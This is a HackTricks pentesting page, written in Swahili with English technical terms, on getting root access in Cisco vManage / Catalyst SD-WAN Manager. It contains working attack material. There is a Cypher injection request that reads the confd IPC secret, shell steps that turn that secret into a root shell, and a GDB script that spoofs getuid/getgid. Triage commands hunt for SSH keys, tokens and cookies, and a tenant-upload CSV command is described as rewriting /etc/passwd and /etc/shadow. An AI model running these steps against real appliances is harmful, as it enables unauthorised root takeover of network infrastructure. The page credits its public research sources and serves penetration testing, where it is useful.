# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Baada ya kupata code execution kwenye Cisco vManage / *Catalyst SD-WAN Manager* kama `vmanage`, `netadmin`, au `vmanage-admin`, maeneo ya kuvutia zaidi ya local privesc kwa kawaida ni `confd` CLI stack, helper ya `cmdptywrapper`, localhost REST APIs, na import/upload handlers zinazoendeshwa na root.

Ikiwa bado unahitaji **initial foothold** kwenye controller, angalia kwanza ukurasa maalumu wa control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ikiwa `/etc/confd/confd_ipc_secret` inasomeka kutoka kwenye foothold yako, Path 1 na Path 2 huwa za kutekelezeka mara moja. Ikiwa umefika kupitia remote file disclosure au webshell, pia kagua nyenzo za SSH za `vmanage-admin` na multitenancy upload handlers; utafiti wa hivi karibuni ulionyesha kuwa zote mbili zinafaa kama pivots.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Tathmini ya vManage ya Synacktiv inaandika njia hii ya root-shell.<sup>[[5]](#references)</sup>

[Documentation ya ConfD](http://66.218.245.39/doc/html/rn03re18.html) iliyounganishwa na ripoti inaeleza IPC authentication; mfano wake wa vManage unaweka secret kwenye `/etc/confd/confd_ipc_secret` na unaonyesha kwamba inasomeka na `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kwa sababu Neo4j inaendeshwa ikiwa na privileges za `vmanage` katika usanidi ulioripotiwa, Cypher injection ya awali inaweza kusoma faili ya siri.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` yenyewe haikubali command-line arguments; inaita `/usr/bin/confd_cli_user`. Workflow iliyoripotiwa hutoa helper huyo anayeweza kusomwa na root kutoka kwenye rootfs, hum-copy kupitia `scp`, husoma help yake, huweka `CONFD_IPC_ACCESS_FILE`, na humwita kwa `-U 0 -G 0` ili kupata root shell.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia ya 2

Njia hii mbadala imechukuliwa kutoka kwa utafiti wa Walmart Global Tech kuhusu vManage 19.2.2.<sup>[[6]](#references)</sup>

Njia ya Synacktiv inahitaji nakala ya `/usr/bin/confd_cli_user`, ambayo inaweza kusomwa na root katika usanidi ulioripotiwa; ripoti ya Walmart badala yake hubadilisha thamani za utambulisho za `confd_cli` chini ya GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Disassembly ya ripoti inaonyesha `confd_cli` ikikusanya UID na GID za caller.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump inayoonyesha ukusanyaji wa UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Jaribio hilo hilo lilionyesha `cmdptywrapper` inayomilikiwa na root ikipokea thamani za wazi za `-g` na `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Mtafiti alihitimisha kuwa `confd_cli` inapeleka UID na GID ya mtumiaji aliyeingia kwenye `cmdptywrapper`.<sup>[[6]](#references)</sup>

Kuendesha `cmdptywrapper` moja kwa moja kwa kutumia `-g 0 -u 0` kulishindikana kwa sababu file descriptor iliyohitajika (`-i 1015` katika mfano) haikupatikana.<sup>[[6]](#references)</sup>

Kwa kuwa `confd_cli` haionyeshi thamani hizo kama arguments, ripoti inatumia GDB kubadilisha thamani zinazorudishwa na `getuid()` na `getgid()`; GDB ilikuwepo kwenye appliance hiyo.<sup>[[5]](#references)[[6]](#references)</sup>

Kwa kutumia `vmanage`, jaribio liliweza kusoma `/etc/confd/confd_ipc_secret`; script ifuatayo inalazimisha miito yote miwili ya identity irudishe zero.<sup>[[6]](#references)</sup>

GDB script iliyotumiwa kwenye ripoti ni:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Matokeo ya console yaliyoripotiwa ni:<sup>[[6]](#references)</sup>

<details>
<summary>Matokeo ya console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Njia ya 3 (hitilafu ya uthibitishaji wa ingizo la CLI ya 2025 - CVE-2025-20122)

Cisco baadaye iliandika njia safi zaidi ya kupata root locally katika advisory yake yenyewe ya [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). **Attacker aliye-authenticate mwenye privileges za kusoma pekee** angeweza kutuma request iliyoundwa mahususi kwa manager CLI na kupata root kutokana na uthibitishaji usiotosha wa ingizo.<sup>[[7]](#references)</sup>

Kwa mtazamo wa offensive, advisory hii pamoja na utafiti wa awali wa CLI zinaonyesha workflow ifuatayo.<sup>[[6]](#references)[[7]](#references)</sup>

1. Mara tu unapokuwa na *foothold* yoyote ya low-priv kwenye box, unapaswa kujaribu local CLI service kabla ya kuanza workflow nzito ya Path 1 / Path 2.
2. Tumia tena artifacts kutoka Path 2 ili kupata trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Chukulia kila field inayotumwa kwenye CLI backend kuwa ya kutiliwa shaka: UID/GID, username, terminal metadata, files zilizoingizwa, au value yoyote itakayotumiwa baadaye na helper anayemilikiwa na root.
4. Ikiwa user wa low-priv anaweza kufikia local CLI socket na kuathiri fields hizo, root inaweza kuwa request moja tu iliyoundwa mahususi.

Baada ya kutua kwenye appliance, kagua local CLI chain kama ifuatavyo.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hii inabadilisha bug ya 2025 kuwa pattern inayoweza kutumika tena katika hunting: tafuta **local CLI shims zinazokusanya utambulisho katika userland na kuusambaza kwa privileged wrapper**.<sup>[[6]](#references)[[7]](#references)</sup>

Usichanganye **CVE-2025-20122** na **CVE-2026-20122** ya baadaye: tatizo la 2025 ni bug ya *local* kutoka CLI hadi root, ilhali tatizo la 2026 ni overwrite ya kiholela ya mafaili kupitia API ya *remote*, ambayo hutumika zaidi kuweka foothold na kisha kurudia Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Advisory ya Cisco ya Februari 2026 inaeleza class nyingine muhimu ya privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). **Attacker wa local mwenye authentication na low privileges** angeweza kupata root kutokana na mechanism isiyotosha ya user-authentication katika REST API.<sup>[[1]](#references)</sup>

Hili ni muhimu kwa sababu privesc ya vManage haijaishia tena kwenye abuse ya `confd`/TTY; baada ya kupata low-priv shell, pia tafuta yafuatayo.<sup>[[1]](#references)</sup>

- API endpoints zinazopatikana kwenye localhost pekee na zinazomwamini caller kupita kiasi
- tokens, cookies, au service credentials zinazoweza kusomeka kutoka kwenye account ya sasa
- vitendo vya root-only vilivyowekwa wazi kupitia `dataservice`/REST handlers ambavyo bado vinaweza ku-triggeriwa locally

Kwa vitendo, ukishapata shell kama `vmanage` au service user mwingine, abuse ya local API inaweza kuwa rahisi ku-automate kuliko abuse ya interactive CLI.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ikiwa muktadha wa session ya ndani unatosha kufikia utendaji wa REST wenye privileged access, pendelea njia ya API: ni rahisi zaidi kureplay, kuscript, na kuichanganya na web sessions au API tokens zilizoibwa.<sup>[[1]](#references)</sup>

## Path 5 (file iliyoundwa mwaka 2026 iliyochakatwa na root - CVE-2026-20245)

Pattern nyingine ya hivi karibuni ni [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Mshambulizi wa ndani mwenye privileges za `netadmin` angeweza kupakia **file iliyoundwa kwa makusudi** ambayo CLI iliishughulikia baadaye kwa njia isiyo salama, na kusababisha command injection kama `root`.<sup>[[2]](#references)</sup>

Kwa mtazamo wa HackTricks, technique yenye thamani ni pana zaidi kuliko CVE hiyo mahususi.<sup>[[2]](#references)</sup>

1. Enumerate kila CLI au workflow ya web inayokubali file: imports, diagnostic bundles, templates, validators, backups, tenant data, n.k.
2. Fuatilia file iliyopakiwa inaishia wapi na ni script au binary ipi inayomilikiwa na root inayotumia.
3. Test kama filename, file content, au metadata iliyoparsiwa huwahi kupitishwa kwenye shell commands, wrapper scripts, au helpers za mtindo wa `system()`.
4. Ikiwa tayari unaweza kufikia `netadmin` (creds halali, session iliyoibwa, au auth-bypass chain), bugs za uchakataji wa file mara nyingi ndiyo njia ya haraka zaidi ya kufikia root.

Google Cloud / Mandiant baadaye walionyesha mfano halisi wa bug class hii ikitumiwa kupitia njia ya uagizaji ya multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Katika shambulio lililozingatiwa, CSV iliyoundwa mahsusi ilirekebisha `/etc/passwd` na `/etc/shadow` ili kuunda akaunti ya muda yenye UID 0 (`troot`). Hilo hufanya waingizaji wa aina ya `tenant-upload` / `tenant-list` kuwa wa kuvutia zaidi: si vipengele vya kuingiza data tu, bali ni front-end za parser zinazoweza kumilikiwa na root.<sup>[[4]](#references)</sup>

Mfumo wa haraka wa hunting upande wa shell ni:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Aina hii ya bug huunganishwa vizuri sana hasa na remote footholds zinazokupa `netadmin` lakini si `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Ni ya thamani kubwa hasa kwa sababu utafiti wa umma ulionyesha kuwa inaweza kufichua `confd_ipc_secret` au private key ya `vmanage-admin`, na hivyo kubadilisha read bug kuwa Path 1 au NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Ni tofauti na CLI bug ya 2025 iliyo hapo juu; VulnCheck iliitumia kupakia webshell, ambayo hufanya local privesc paths kwenye ukurasa huu kuwa muhimu mara moja.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Mshambulizi aliye-authenticated anaweza kutekeleza script katika web interface ya mtumiaji aliyeathirika; tathmini ikiwa session context inayotokana inaweza kufichua API/CLI actions zinazofikia `vshell` au mojawapo ya local privesc paths zilizo hapo juu.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ni precursor yenye nguvu sana kwa Path 5 kwa sababu `netadmin` ndiyo level inayohitajika hasa na crafted-file privesc ya 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ina offensive value inayofanana na CVE-2026-20122, lakini kupitia web UI upload path ya baadaye; Cisco inasema file iliyoundwa au kuandikwa upya na bug hiyo inaweza kutumiwa baadaye kupata root.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusions za 2026 zilionyesha kuwa attackers wanaweza kurudisha mfumo kwenye SD-WAN build ya zamani iliyo vulnerable, kutumia old CLI root bug, kisha kurejesha version ya awali.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Imeelezwa vizuri zaidi kwenye dedicated SD-WAN control-plane page; inaweza kuongeza SSH key ya `vmanage-admin`, na kutoa persistent NETCONF access kwa follow-on management-plane actions.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Critical authentication bypass in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
